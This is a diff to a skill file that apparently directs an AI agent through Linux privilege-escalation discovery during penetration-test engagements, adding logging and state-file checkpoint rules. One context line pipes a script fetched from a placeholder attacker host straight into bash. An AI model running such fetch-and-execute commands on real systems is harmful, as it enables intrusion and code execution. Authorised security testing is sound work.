@@ -42,6 +42,23 @@ When an engagement directory exists, log as you work:
 - **Evidence** → save enumeration output to `engagement/evidence/` (e.g.,
   `linpeas-output.txt`, `suid-binaries.txt`).
 
+### Invocation Log
+
+Immediately on activation — before reading state.md or doing any assessment —
+log invocation to both the screen and activity.md:
+
+1. **On-screen**: Print `[linux-discovery] Activated → <target>` so the operator
+   sees which skill is running.
+2. **activity.md**: Append:
+   ```
+   ### [HH:MM] linux-discovery → <target>
+   - Invoked (assessment starting)
+   ```
+
+This entry must be written NOW, not deferred. Subsequent milestone entries
+append bullet points under this same header.
+
+
 ## State Management
 
 If `engagement/state.md` exists, read it before starting. Use it to:
@@ -49,7 +66,13 @@ If `engagement/state.md` exists, read it before starting. Use it to:
 - Leverage existing credentials or access
 - Check what's been tried and failed (Blocked section)
 
-After completing enumeration, update `engagement/state.md`:
+Write `engagement/state.md` at these checkpoints (not just at completion):
+1. **After confirming a vulnerability** — add to Vulns with `[found]`
+2. **After successful exploitation** — add credentials, access, pivot paths
+3. **Before routing to another skill** — the next skill reads state.md on activation
+
+At each checkpoint and on completion, update the relevant sections of
+`engagement/state.md`:
 - **Targets**: Add system info (hostname, OS, kernel version, architecture)
 - **Access**: Update current access level (user, service account, root)
 - **Vulns**: Add confirmed privesc vectors as one-liners with `[found]` status
@@ -526,6 +549,10 @@ curl -sL https://ATTACKER/linpeas.sh | bash
 ```
 
 ## Step 12: Routing Decision Tree
+
+**Before routing**: Write `engagement/state.md` and append to
+`engagement/activity.md` with results so far. The next skill reads state.md
+on activation — stale state means duplicate work or missed context.
 
 Based on enumeration findings, route to the appropriate technique skill:
 
